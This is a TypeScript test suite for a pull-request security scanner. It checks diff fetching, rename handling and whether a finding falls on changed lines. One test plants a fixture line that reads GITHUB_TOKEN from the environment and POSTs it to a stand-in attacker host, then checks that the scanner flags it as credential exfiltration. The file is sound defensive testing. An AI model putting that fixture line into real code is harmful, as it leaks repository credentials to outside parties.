import { execFileSync } from 'child_process';
import { mkdtemp, mkdir, rm, writeFile } from 'fs/promises';
import { tmpdir } from 'os';
import { join } from 'path';
import { afterEach, describe, expect, it } from 'vitest';
import { createScanContext } from '../scan-context.js';
import { filterFindingsToChangedLines } from '../scan-context.js';
import { validateFindingLocations } from '../location-validator.js';
import { getGitChanges, getUnifiedDiff } from '../fetcher.js';

describe('Spectre PR pipeline simulation', () => {
  const workspaces: string[] = [];

  afterEach(async () => {
    await Promise.all(workspaces.splice(0).map(path => rm(path, { recursive: true, force: true })));
  });

  it('uses a real PR diff and only permits evidence introduced by that diff', async () => {
    const workspacePath = await mkdtemp(join(tmpdir(), 'layne-spectre-pr-'));
    workspaces.push(workspacePath);
    const git = (...args: string[]) => execFileSync('git', ['-C', workspacePath, ...args], { encoding: 'utf8' }).trim();
    git('init');
    git('config', 'user.email', 'layne-test@example.test');
    git('config', 'user.name', 'Layne Test');
    await mkdir(join(workspacePath, 'src'), { recursive: true });
    await writeFile(join(workspacePath, 'src/app.js'), 'const oldCommand = "npm run build";\n', 'utf8');
    git('add', '.');
    git('commit', '-m', 'base');
    const baseSha = git('rev-parse', 'HEAD');

    await writeFile(join(workspacePath, 'src/app.js'), [
      'const oldCommand = "npm run build";',
      'const token = process.env.GITHUB_TOKEN;',
      "await fetch('https://attacker.example/collect', { method: 'POST', body: token });",
      '',
    ].join('\n'), 'utf8');
    git('add', '.');
    git('commit', '-m', 'pr change');
    const headSha = git('rev-parse', 'HEAD');

    const context = await createScanContext({
      workspacePath, changedFiles: ['src/app.js'], baseSha, headSha,
      scanConfig: { mode: 'changed_files', contextLines: 1 },
    });
    expect(context.promptFiles[0]?.content).toContain('process.env.GITHUB_TOKEN');

    const validated = await validateFindingLocations([{
      file: 'src/app.js', line: 1, startLine: 1, endLine: 1,
      evidence: "const token = process.env.GITHUB_TOKEN;\nawait fetch('https://attacker.example/collect', { method: 'POST', body: token });",
      severity: 'high', message: 'credential exfiltration', ruleId: 'credential-exfiltration', tool: 'spectre',
    }], { workspacePath, changedFiles: context.scanFiles, changedLineRanges: context.changedLineRanges });
    const [valid] = filterFindingsToChangedLines(validated, context);

    expect(valid.annotationEligible).toBe(true);
    expect(valid.startLine).toBe(2);
    expect(valid.endLine).toBe(3);
  });

  it('preserves a pure rename as one typed change with no invented hunks', async () => {
    const workspacePath = await mkdtemp(join(tmpdir(), 'layne-spectre-rename-'));
    workspaces.push(workspacePath);
    const git = (...args: string[]) => execFileSync('git', ['-C', workspacePath, ...args], { encoding: 'utf8' }).trim();
    git('init');
    git('config', 'user.email', 'layne-test@example.test');
    git('config', 'user.name', 'Layne Test');
    await mkdir(join(workspacePath, 'src'), { recursive: true });
    await writeFile(join(workspacePath, 'src/old.ts'), 'export const value = 1;\n', 'utf8');
    git('add', '.');
    git('commit', '-m', 'base');
    const baseSha = git('rev-parse', 'HEAD');
    git('mv', 'src/old.ts', 'src/new.ts');
    git('commit', '-m', 'rename');
    const headSha = git('rev-parse', 'HEAD');

    const changes = await getGitChanges({ workspacePath, baseSha, headSha });
    const unifiedDiff = await getUnifiedDiff({
      workspacePath, baseSha, headSha, contextLines: 3, files: ['src/new.ts'], changes,
    });

    expect(changes).toEqual([expect.objectContaining({ status: 'renamed', oldPath: 'src/old.ts', newPath: 'src/new.ts' })]);
    expect(unifiedDiff.files).toEqual([{ change: changes[0], hunks: [] }]);
  });

  it('keeps a content-modified rename mapped once with its textual hunk', async () => {
    const workspacePath = await mkdtemp(join(tmpdir(), 'layne-spectre-modified-rename-'));
    workspaces.push(workspacePath);
    const git = (...args: string[]) => execFileSync('git', ['-C', workspacePath, ...args], { encoding: 'utf8' }).trim();
    git('init');
    git('config', 'user.email', 'layne-test@example.test');
    git('config', 'user.name', 'Layne Test');
    await mkdir(join(workspacePath, 'src'), { recursive: true });
    await writeFile(join(workspacePath, 'src/old.ts'), Array.from({ length: 12 }, (_, index) => `export const value${index} = ${index};`).join('\n') + '\n', 'utf8');
    git('add', '.');
    git('commit', '-m', 'base');
    const baseSha = git('rev-parse', 'HEAD');
    git('mv', 'src/old.ts', 'src/new.ts');
    await writeFile(join(workspacePath, 'src/new.ts'), Array.from({ length: 12 }, (_, index) => `export const value${index} = ${index === 5 ? 500 : index};`).join('\n') + '\n', 'utf8');
    git('add', '.');
    git('commit', '-m', 'rename and modify');
    const headSha = git('rev-parse', 'HEAD');

    const changes = await getGitChanges({ workspacePath, baseSha, headSha });
    const unifiedDiff = await getUnifiedDiff({
      workspacePath, baseSha, headSha, contextLines: 1, files: ['src/new.ts'], changes,
    });

    expect(changes).toHaveLength(1);
    expect(changes[0]).toMatchObject({ status: 'renamed', oldPath: 'src/old.ts', newPath: 'src/new.ts' });
    expect(unifiedDiff.files).toHaveLength(1);
    expect(unifiedDiff.files[0]?.hunks[0]?.lines).toEqual(expect.arrayContaining([
      expect.objectContaining({ type: 'deletion', content: 'export const value5 = 5;' }),
      expect.objectContaining({ type: 'addition', content: 'export const value5 = 500;' }),
    ]));
  });
});
